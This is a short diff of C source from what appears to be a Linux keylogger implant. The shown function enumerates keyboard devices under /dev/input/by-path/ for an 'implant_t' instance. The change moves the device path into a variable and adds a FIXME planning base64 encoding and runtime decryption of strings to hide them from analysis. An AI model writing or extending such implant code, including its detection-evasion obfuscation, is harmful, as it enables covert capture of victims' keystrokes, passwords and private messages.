@@ -15,11 +15,13 @@
 
 #include <dirent.h>
 #include <fcntl.h>
+#include <limits.h>
 #include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/dir.h>
 #include <sys/queue.h>
 #include <sys/stat.h>
 #include <sys/types.h>
@@ -41,11 +43,13 @@ is_kbd(const struct dirent *f) {
 }
 
 uint8_t fetch_available_keyboards(implant_t *instance) {
-    /* FIXME(djnn): decrypt strings at runtime */
 
     char rpath[2048] = {0};
     struct dirent **char_devices = NULL;
     int possible_paths = 0;
+
+    /* FIXME(djnn): base64 then decrypt string at runtime */
+    const char *dev_input_by_path = "/dev/input/by-path/";
 
     if (!instance) {
 
@@ -55,8 +59,8 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
         return ERROR;
     }
 
-    possible_paths = scandir("/dev/input/by-path/", &char_devices, &is_kbd, &alphasort);
-    if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/")) {
+    possible_paths = scandir(dev_input_by_path, &char_devices, &is_kbd, &alphasort);
+    if (-1 == possible_paths || 0 > chdir(dev_input_by_path)) {
 
 #ifdef DEBUG
         DEBUG_LOG("could not find possible keyboard paths\n");
